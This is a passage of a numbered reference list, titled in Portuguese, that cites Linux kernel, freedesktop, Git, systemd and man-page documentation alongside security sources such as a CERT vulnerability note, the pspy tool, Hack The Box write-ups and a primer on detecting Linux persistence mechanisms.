- [21] [binfmt_misc — documentação do kernel Linux](https://www.kernel.org/doc/html/latest/admin-guide/binfmt-misc.html)
- [22] [Associações de aplicativos MIME](https://specifications.freedesktop.org/mime-apps/1.0.1/file.html)
- [23] [Especificação Shared MIME-info](https://specifications.freedesktop.org/shared-mime-info/latest-single/)
- [24] [Especificação Desktop Entry](https://specifications.freedesktop.org/desktop-entry/latest-single/)
- [25] [pspy](https://github.com/DominicBreuker/pspy)
- [26] [Linguagem Kconfig](https://docs.kernel.org/kbuild/kconfig-language.html)
- [27] [Makefile de crypto do Linux](https://raw.githubusercontent.com/torvalds/linux/master/crypto/Makefile)
- [28] [CERT VU#260001: vulnerabilidade de cache de páginas do AF_ALG do kernel Linux](https://kb.cert.org/vuls/id/260001)
- [29] [modprobe(8) — página de manual do Linux](https://man7.org/linux/man-pages/man8/modprobe.8.html)
- [30] [0xdf — HTB: Nexus](https://0xdf.gitlab.io/2026/09/02/htb-nexus.html)
- [31] [Documentação do Git `hash-object`](https://git-scm.com/docs/git-hash-object)
- [32] [Documentação do Git `ls-tree`](https://git-scm.com/docs/git-ls-tree)
- [33] [Documentação de configuração do Git](https://git-scm.com/docs/git-config)
- [34] [`openat2(2)` — página de manual do Linux](https://man7.org/linux/man-pages/man2/openat2.2.html)
- [35] [Documentação de generators do systemd](https://github.com/systemd/systemd/blob/main/man/systemd.generator.xml)
- [36] [Elastic Security Labs — engenharia de detecção no Linux: mecanismos de persistência](https://www.elastic.co/security-labs/threat-command/primer-on-persistence-mechanisms)
- [37] [0xdf — HTB: MakeSense](https://0xdf.gitlab.io/2026/10/31/htb-makesense.html)
